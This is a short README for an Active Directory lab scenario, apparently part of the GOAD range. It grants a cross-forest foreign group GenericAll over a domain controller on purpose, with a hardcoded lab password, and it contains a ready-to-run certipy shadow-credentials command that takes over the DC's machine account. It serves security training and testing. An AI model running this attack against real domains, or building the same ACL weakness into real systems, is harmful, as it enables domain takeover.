# foreign-group-acl

On a DC of a domain with a forest trust (GOAD-Base: dc01 sevenkingdoms.local or dc03 essos.local), creates `scn-foreign-user` (password `Aa1234567890!`) in the partner forest, the domain-local group `scn-foreign-group` in the target domain with that user as member, and gives the group `GenericAll` on the target DC's computer object.

Attack (from the partner forest):

    certipy shadow auto -u scn-foreign-user@<partner domain> -p 'Aa1234567890!' -dc-ip <target dc ip> -target <target dc fqdn> -account '<target dc hostname>$'

How to verify:

    Get-ADGroupMember scn-foreign-group   # on the target DC: the partner user (foreign security principal)

Disable removes the ACE, the group, the foreign security principal object in `CN=ForeignSecurityPrincipals`, and the user in the partner forest.
